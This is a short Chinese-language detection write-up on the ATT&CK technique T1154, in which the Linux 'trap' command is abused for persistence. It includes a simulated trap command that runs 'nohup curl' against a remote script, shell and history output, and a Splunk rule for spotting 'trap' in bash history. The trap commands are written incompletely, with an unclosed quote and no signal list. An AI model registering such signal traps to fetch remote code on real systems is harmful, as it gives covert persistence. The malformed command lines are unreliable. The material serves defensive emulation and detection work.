# T1154-linux-trap

## 来自ATT&CK的描述

该`trap`命令允许程序和shell指定在接收中断信号时将执行的命令。常见的情况是脚本允许正常终止和处理常见的键盘中断，如`ctrl+c`和`ctrl+d`。攻击者可以使用它来注册当shell遇到特定中断以执行或作为持久性机制时要执行的代码。陷阱命令具有以下格式`trap 'command list' signals`，其中当接收到“信号”时将执行“命令列表”。

## 模拟攻击

trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh # 脚本即使在退出后（ctrl + c）也会即系执行程序/脚本。

trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 

关于trap、nohup命令的更多解释，你可以查看参考链接部分。

## 检测日志源

bash历史命令

## 攻击复现

icbc@icbc:/$ trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 

> ^C

## 攻击留痕

icbc@icbc:/$ history

 693  trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh 

## 检测规则

index=linux sourcetype=bash_history "trap *" | table host,user_name,bash_command

## 参考推荐

MITRE-ATT&CK-T1154:https://attack.mitre.org/techniques/T1154/

linux下trap命令详解：https://blog.csdn.net/carolzhang8406/article/details/46504415/

linux下nohup命令浅析：https://www.bbsmax.com/A/kjdw9606JN/